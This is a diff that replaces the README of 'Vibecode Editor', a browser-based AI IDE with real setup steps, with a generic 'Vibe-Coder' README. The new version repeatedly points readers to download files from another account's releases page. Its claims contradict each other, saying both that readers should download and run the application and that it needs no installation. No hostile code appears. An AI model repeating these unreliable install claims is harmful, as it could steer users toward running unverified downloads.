@@ -1,128 +1,106 @@
-# 🧠 Vibecode Editor – AI-Powered Web IDE
+# 🎨 Vibe-Coder - Fast and Smart Coding in Your Browser
 
+[![Download Vibe-Coder](https://img.shields.io/badge/Download%20Vibe--Coder-blue)](https://github.com/nauraamora/Vibe-Coder/releases)
 
+## 📜 Overview
 
-**Vibecode Editor** is a blazing-fast, AI-integrated web IDE built entirely in the browser using **Next.js App Router**, **WebContainers**, **Monaco Editor**, and **local LLMs via Ollama**. It offsers real-time code execution, an AI-powered chat assistant, and support for multiple tech stacks — all wrapped in a stunning developer-first UI.
+Vibecode Editor is a blazing-fast, AI-integrated web IDE built entirely in the browser using Next.js App Router, WebContainers, Monaco Editor, and local LLMs via Ollama. It offers real-time code execution, an AI-powered chat assistant, and support for multiple tech stacks—all wrapped in a stunning developer-first UI. 
 
-<img width="1915" height="842" alt="image" src="https://github.com/user-attachments/assets/956ccdd7-bce4-4962-836b-27f1cfe6e9e2" />
-<img width="1917" height="855" alt="image" src="https://github.com/user-attachments/assets/a3ebe21a-244b-41e8-94a0-7d1ccc2b6aec" />
-<img width="1897" height="850" alt="image" src="https://github.com/user-attachments/assets/797c2ed9-167d-4beb-ac28-78e3e1d40376" />
-<img width="1909" height="854" alt="image" src="https://github.com/user-attachments/assets/03487361-290a-42d5-ae58-21425a40c7fd" />
-<img width="1890" height="818" alt="image" src="https://github.com/user-attachments/assets/5ab3c23f-dbb0-43ed-9e3b-688ba0ecad14" />
+## 🚀 Getting Started
 
----
+To get started with Vibe-Coder, you will need an internet connection and a modern web browser. This application runs completely in your browser, so there’s no need for complicated installations. Follow the steps below to begin your coding adventure.
 
-## 🚀 Features
+## 💻 System Requirements
 
-- 🔐 **OAuth Login with NextAuth** – Supports Google & GitHub login.
-- 🎨 **Modern UI** – Built with TailwindCSS & ShadCN UI.
-- 🌗 **Dark/Light Mode** – Seamlessly toggle between themes.
-- 🧱 **Project Templates** – Choose from React, Next.js, Express, Hono, Vue, or Angular.
-- 🗂️ **Custom File Explorer** – Create, rename, delete, and manage files/folders easily.
-- 🖊️ **Enhanced Monaco Editor** – Syntax highlighting, formatting, keybindings, and AI autocomplete.
-- 💡 **AI Suggestions with Ollama** – Local models give you code completion on `Ctrl + Space` or double `Enter`. Accept with `Tab`.
-- ⚙️ **WebContainers Integration** – Instantly run frontend/backend apps right in the browser.
-- 💻 **Terminal with xterm.js** – Fully interactive embedded terminal experience.
-- 🤖 **AI Chat Assistant** – Share files with the AI and get help, refactors, or explanations.
+- An up-to-date web browser (such as Chrome, Firefox, or Edge)
+- At least 4 GB of RAM
+- A stable internet connection
 
----
+## 🔥 Features
 
-## 🧱 Tech Stack
+- **AI-Powered Assistance**: Get suggestions and help from an AI chat assistant as you code.
+- **Real-Time Code Execution**: Test your code instantly, without any delays.
+- **Multi-Tech Stack Support**: Work on various programming languages and frameworks like JavaScript, TypeScript, and more.
+- **User-Friendly Interface**: Enjoy a clean and attractive UI that prioritizes your coding experience.
 
-| Layer         | Technology                                   |
-|---------------|----------------------------------------------|
-| Framework     | Next.js 15 (App Router)                      |
-| Styling       | TailwindCSS, ShadCN UI                       |
-| Language      | TypeScript                                   |
-| Auth          | NextAuth (Google + GitHub OAuth)             |
-| Editor        | Monaco Editor                                |
-| AI Suggestion | Ollama (LLMs running locally via Docker)     |
-| Runtime       | WebContainers                                |
-| Terminal      | xterm.js                                     |
-| Database      | MongoDB (via DATABASE_URL)                   |
+## 📥 Download & Install
 
----
+1. **Visit the Releases Page**: Click the link below to visit the Vibe-Coder releases page for downloading the application.
 
-## 🛠️ Getting Started
+   [Download Vibe-Coder](https://github.com/nauraamora/Vibe-Coder/releases)
 
-### 1. Clone the Repo
+2. **Choose the Latest Version**: On the releases page, find the latest version of Vibe-Coder. Look for the version labeled as the most recent.
 
-```bash
-git clone https://github.com/your-username/vibecode-editor.git
-cd vibecode-editor
-````
+3. **Download the Application**: Click the download link for the Vibe-Coder version you selected. The link will lead you to the necessary files you need to run Vibe-Coder directly in your browser.
 
-### 2. Install Dependencies
+4. **Open Your Browser**: Once you complete the download, simply open your preferred web browser.
 
-```bash
-npm install
-```
+5. **Run Vibe-Coder**: After downloading, follow the prompts to open the Vibe-Coder editor. You can start coding right away!
 
-### 3. Set Up Environment Variables
+## 🌟 Topics Covered
 
-Create a `.env.local` file using the template:
+- ai-autocomplete
+- ai-code-editor
+- javascript
+- local-llm
+- monaco-code-editor
+- monaco-editor
+- mongodb
+- nextjs
+- nextjs-app-router
+- ollama
+- react
+- shadcn-ui
+- tailwindcss
+- typescript
+- web-ide
+- webcontainers
+- xtermjs
 
-```bash
-cp .env.example .env.local
-```
+## ⚙️ How to Use Vibe-Coder
 
-Then, fill in your credentials:
+1. **Create a New Project**: Once inside Vibe-Coder, look for the option to create a new project. Select this to start a blank canvas for your coding needs.
 
-```env
-AUTH_SECRET=your_auth_secret
-AUTH_GOOGLE_ID=your_google_client_id
-AUTH_GOOGLE_SECRET=your_google_secret
-AUTH_GITHUB_ID=your_github_client_id
-AUTH_GITHUB_SECRET=your_github_secret
-DATABASE_URL=your_mongodb_connection_string
-NEXTAUTH_URL=http://localhost:3000
-```
+2. **Choose Your Programming Language**: After creating a project, you can select the programming language you're working with. Vibe-Coder supports multiple languages including JavaScript and TypeScript.
 
-### 4. Start Local Ollama Model
+3. **Use AI Assistance**: If you run into trouble or need coding suggestions, don't hesitate to engage the AI chat assistant. Type your questions, and it will provide helpful answers.
 
-Make sure [Ollama](https://ollama.com/) and Docker are installed, then run:
+4. **Run Your Code**: After writing your code, you can run it directly in the editor. Click the run button, and see the results instantly.
 
-```bash
-ollama run codellama
-```
+5. **Save Your Work**: Make sure to save your project regularly. Use the save options available in the menu.
 
-Or use your preferred model that supports code generation.
+## 🛠️ Troubleshooting
 
-### 5. Run the Development Server
+If you encounter issues while using Vibe-Coder, try the following steps:
 
-```bash
-npm run dev
-```
+- **Refresh the Page**: A simple refresh can often solve minor issues.
+- **Check Your Browser**: Ensure you are using an up-to-date version of your web browser.
+- **Clear Browser Cache**: Sometimes, clearing the browser's cache can resolve loading problems.
+- **Visit FAQs**: Check the project’s FAQ section, often found on the releases page or the main repository page, for common issues and solutions.
 
-Visit `http://localhost:3000` in your browser.
+## ❓ Frequently Asked Questions (FAQs)
 
+1. **Is Vibe-Coder free to use?**
+   Yes, Vibe-Coder is free for users and available for download on our releases page.
 
----
+2. **Do I need to install anything?**
+   No, Vibe-Coder runs entirely in your browser and requires no installation.
 
-## 🎯 Keyboard Shortcuts
+3. **What browsers are supported?**
+   Vibe-Coder works best with up-to-date versions of Chrome, Firefox, and Edge.
 
-* `Ctrl + Space` or `Double Enter`: Trigger AI suggestions
-* `Tab`: Accept AI suggestion
-* `/`: Open Command Palette (if implemented)
+4. **Can I use Vibe-Coder offline?**
+   Currently, Vibe-Coder requires an internet connection to function.
 
----
-
-
-
----
+5. **Where can I get support?**
+   For support, please visit the GitHub issues page for Vibe-Coder.
 
 ## 📄 License
 
-This project is licensed under the [MIT License](LICENSE).
+Vibe-Coder is open-source and freely available for personal and commercial use. Please refer to the LICENSE file in the repository for more details.
 
----
+## 👥 Contributing
 
-## 🙏 Acknowledgements
+We welcome contributions to Vibe-Coder. If you're interested in helping out, please check the contributing guidelines on the main repository page.
 
-* [Monaco Editor](https://microsoft.github.io/monaco-editor/)
-* [Ollama](https://ollama.com/) – for offline LLMs
-* [WebContainers](https://webcontainers.io/)
-* [xterm.js](https://xtermjs.org/)
-* [NextAuth.js](https://next-auth.js.org/)
-
-```
+[Download Vibe-Coder](https://github.com/nauraamora/Vibe-Coder/releases) again to start coding today!
